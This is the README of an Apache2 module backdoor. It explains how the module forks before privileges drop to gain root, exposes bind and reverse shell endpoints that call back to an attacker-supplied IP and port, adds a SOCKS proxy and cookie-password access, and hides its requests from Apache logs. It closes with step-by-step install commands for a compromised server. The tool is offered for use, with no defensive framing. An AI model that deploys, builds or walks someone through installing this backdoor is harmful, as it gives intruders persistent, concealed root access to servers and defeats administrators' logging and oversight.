# Apache2 mod_backdoor
Apache2 Module Backdoor is a stealth backdoor using an Apache2 module.<br/>
The main idea is to fork() the main Apache2 process just after it has readed its config.
Since it's forked before the root user transfer the process to www-data, you can execute command as root.<br/>


# Features

* Bind TTY Shell
* Reverse Shell (TTY ,PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns a new forked independent root process attached to PID 1
* Socks proxy (Socks5 code from https://github.com/fgssfgss/socks_proxy)
* Password Protection through cookie headers
* Ping module to know if its still active


There is also a hook to bypass the Apache2 logging mechanism. Each request to the backdoor module **are not logged** by Apache2.

# Demo
***COMING SOON***

# Description

The password is passed through Cookie headers: `Cookie: password=backdoor`. You could easily edit it:
there are some constants in the beginning of `mod_backdoor.c`. <br/>
Each following requests must contain this password to interact with the module.<br/>
Each request containing this cookie will not be logged by Apache if the module is running. <br/>
Each shell spawns in its own process, attached to PID 1, so you could spawn many shells. <br/>

### Bind TTY Shell
The endpoint  `http[s]://<TARGET>/bind/<PORT>` bind a listening port on `<TARGET>:<PORT>` <br/>
When a connection is initiated to the listening port, the port closes. <br/>
I've used forkpty() to obtain a native TTY shell, working with an IPC UNIX socket to communicate 
between forked TTY process and the new socket you just opened.

### Reverse TTY Shell
It works like the bind shell, the endpoint `http[s]://<TARGET>/revtty/<IP>/<PORT>` returns a TTY
shell to `<IP>:<PORT>` <br/>


### Reverse Shell (No TTY)
The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>` <br/>
`<PROG>` must be one of this: <br/>

| Native   | External  |    
| :------: | :--------:|
|   sh     |    php    |
|   bash   |    python |
|   dash   |    ruby   |
|   ash    |    perl   |
|   tcsh   |           |
|   ksh    |           |

`<PROG>` must be in lower-case.<br/>
PHP uses the `exec` function.<br/>
Ruby isn't using `/bin/sh`.

### Ping module
The endpoint `http[s]://<TARGET>/ping` tell you if the module is currently working.

# Notes
You could easily edit the differents endpoints and the password. It is defined by constants 
at the beginning of `mod_backdoor.c`.<br/>
Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
More info about Ringbuilder:<br/>
https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>

Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy <br/>

# Builds
For developpement :<br/>
* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
 -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Compile it like above for the desired arch and retrieve the mod_backdoor.so
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Create `/etc/apache2/mod-available/backdoor.load` --> <br/>
 `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))
